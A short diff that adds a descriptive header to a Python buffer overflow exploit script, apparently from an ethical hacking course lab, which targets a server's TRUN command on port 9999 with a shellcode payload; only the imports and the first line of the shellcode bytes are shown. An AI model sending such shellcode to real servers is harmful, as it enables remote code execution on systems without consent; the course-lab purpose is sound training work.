@@ -1,4 +1,16 @@
 #!/usr/bin/python3
+# Script:                       bufferoverflowremake.py
+# Author:                       Zachary Derrick (TCM: Practical Ethical Hacking)
+# Date of latest revision:      2024.01.09
+# Purpose:                      This script is a demonstration of a buffer overflow exploit. 
+# 								It constructs a payload containing shellcode designed to exploit 
+# 								a vulnerability in a target server. The shellcode, represented by 
+# 								the 'overflow' variable, aims to execute arbitrary commands on the 
+# 								server. The script then attempts to establish a connection to the 
+# 								target server at IP address on port 9999 and sends the crafted 
+# 								payload using the TRUN command to test and potentially exploit the 
+# 								target system.
+
 import sys, socket
 
 overflow = (b"\xdb\xc8\xbe\x4c\xb2\x55\x2a\xd9\x74\x24\xf4\x5a\x29\xc9"
